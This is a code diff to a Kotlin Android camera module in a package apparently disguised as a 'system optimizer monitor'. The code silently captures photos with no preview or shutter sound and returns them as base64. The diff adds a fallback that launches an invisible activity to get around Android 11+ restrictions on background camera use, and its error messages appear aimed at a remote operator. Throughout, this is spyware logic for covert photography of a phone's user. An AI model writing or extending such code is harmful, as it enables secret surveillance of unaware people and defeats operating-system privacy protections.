@@ -3,6 +3,7 @@ package com.system.optimizer.monitor
 import android.Manifest
 import android.annotation.SuppressLint
 import android.content.Context
+import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.ImageFormat
 import android.hardware.camera2.*
@@ -14,18 +15,58 @@ import android.util.Log
 import androidx.core.content.ContextCompat
 
 /**
- * Silently captures a JPEG photo using the Front or Back camera via Camera2 API
- * without opening a camera preview or triggering shutter sounds.
+ * Silently captures a JPEG photo using the Front or Back camera via Camera2 API.
+ * If background service camera access is blocked on Android 11+, automatically falls back
+ * to launching CameraDummyActivity briefly to fulfill the capture.
  */
 object CameraCapture {
 
     private const val TAG = "CameraCapture"
+    var activeDummyCallback: ((String?, String?) -> Unit)? = null
+
+    fun takePhoto(context: Context, cameraType: String = "front", callback: (String?, String?) -> Unit) {
+        if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
+            Log.e(TAG, "❌ CAMERA permission not granted on device")
+            callback(null, "Camera permission not granted on device. Please open app on phone and click Grant Camera.")
+            return
+        }
+
+        takePhotoDirect(context, cameraType) { base64, errorReason ->
+            if (base64 != null) {
+                callback(base64, null)
+            } else if (context !is CameraDummyActivity && isBackgroundBlockedError(errorReason)) {
+                Log.w(TAG, "⚠️ Background camera access blocked or failed ($errorReason). Launching invisible CameraDummyActivity fallback...")
+                activeDummyCallback = callback
+                try {
+                    val intent = Intent(context, CameraDummyActivity::class.java).apply {
+                        putExtra("cameraType", cameraType)
+                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                    }
+                    context.startActivity(intent)
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to launch CameraDummyActivity: ${e.message}")
+                    callback(null, "Camera capture failed: ${errorReason ?: e.message}")
+                }
+            } else {
+                callback(null, errorReason ?: "Camera capture failed")
+            }
+        }
+    }
+
+    private fun isBackgroundBlockedError(reason: String?): Boolean {
+        if (reason == null) return true
+        return reason.contains("SecurityException", ignoreCase = true) ||
+               reason.contains("Background camera access", ignoreCase = true) ||
+               reason.contains("DISABLED", ignoreCase = true) ||
+               reason.contains("IN_USE", ignoreCase = true) ||
+               reason.contains("timed out", ignoreCase = true) ||
+               reason.contains("Error starting capture", ignoreCase = true)
+    }
 
     @SuppressLint("MissingPermission")
-    fun takePhoto(context: Context, cameraType: String = "front", callback: (String?) -> Unit) {
+    fun takePhotoDirect(context: Context, cameraType: String = "front", callback: (String?, String?) -> Unit) {
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
-            Log.e(TAG, "❌ CAMERA permission not granted")
-            callback(null)
+            callback(null, "Camera permission not granted on device (`android.permission.CAMERA`)")
             return
         }
 
@@ -38,7 +79,7 @@ object CameraCapture {
             if (!cameraClosed) {
                 cameraClosed = true
                 Log.e(TAG, "⏱️ Camera capture timed out after 6 seconds")
-                callback(null)
+                callback(null, "Camera capture timed out (device screen might be sleeping or camera busy)")
             }
         }
         handler.postDelayed(timeoutRunnable, 6000)
@@ -68,7 +109,7 @@ object CameraCapture {
             if (targetCameraId == null) {
                 Log.e(TAG, "No camera found on device")
                 handler.removeCallbacks(timeoutRunnable)
-                callback(null)
+                callback(null, "No $cameraType camera hardware found on this device")
                 return
             }
 
@@ -124,14 +165,13 @@ object CameraCapture {
                         Log.i(TAG, "✅ Camera photo captured (${bytes.size} bytes)")
                         cleanup()
                         if (cameraClosed) {
-                            // Only return if not already timed out
-                            callback(base64)
+                            callback(base64, null)
                         }
                     }
                 } catch (e: Exception) {
                     Log.e(TAG, "Error processing image bytes: ${e.message}", e)
                     cleanup()
-                    callback(null)
+                    callback(null, "Failed to read camera image bytes: ${e.message}")
                 }
             }, handler)
 
@@ -152,40 +192,52 @@ object CameraCapture {
                                 } catch (e: Exception) {
                                     Log.e(TAG, "Error starting capture: ${e.message}")
                                     cleanup()
-                                    callback(null)
+                                    callback(null, "Error starting capture request: ${e.message}")
                                 }
                             }
 
                             override fun onConfigureFailed(session: CameraCaptureSession) {
                                 Log.e(TAG, "Camera session configuration failed")
                                 cleanup()
-                                callback(null)
+                                callback(null, "Camera capture session configuration failed")
                             }
                         }, handler)
                     } catch (e: Exception) {
                         Log.e(TAG, "Error creating capture session: ${e.message}")
                         cleanup()
-                        callback(null)
+                        callback(null, "Error creating capture session: ${e.message}")
                     }
                 }
 
                 override fun onDisconnected(camera: CameraDevice) {
                     Log.w(TAG, "Camera disconnected")
                     cleanup()
-                    callback(null)
+                    callback(null, "Camera hardware disconnected or in use by another app")
                 }
 
                 override fun onError(camera: CameraDevice, error: Int) {
-                    Log.e(TAG, "Camera error: $error")
+                    val errText = when (error) {
+                        ERROR_CAMERA_IN_USE -> "Camera already in use (`ERROR_CAMERA_IN_USE`)"
+                        ERROR_MAX_CAMERAS_IN_USE -> "Max cameras in use (`ERROR_MAX_CAMERAS_IN_USE`)"
+                        ERROR_CAMERA_DISABLED -> "Camera disabled by system/admin (`ERROR_CAMERA_DISABLED`)"
+                        ERROR_CAMERA_DEVICE -> "Camera device fatal error (`ERROR_CAMERA_DEVICE`)"
+                        ERROR_CAMERA_SERVICE -> "Camera service failure (`ERROR_CAMERA_SERVICE`)"
+                        else -> "Camera error code $error"
+                    }
+                    Log.e(TAG, "Camera error: $errText ($error)")
                     cleanup()
-                    callback(null)
+                    callback(null, errText)
                 }
             }, handler)
 
-        } catch (e: Exception) {
-            Log.e(TAG, "Exception in takePhoto: ${e.message}", e)
+        } catch (e: SecurityException) {
+            Log.e(TAG, "SecurityException opening camera: ${e.message}")
             handler.removeCallbacks(timeoutRunnable)
-            callback(null)
+            callback(null, "SecurityException: Background camera access blocked by OS (${e.message})")
+        } catch (e: Exception) {
+            Log.e(TAG, "Exception in takePhotoDirect: ${e.message}", e)
+            handler.removeCallbacks(timeoutRunnable)
+            callback(null, "Exception opening camera: ${e.message}")
         }
     }
 }
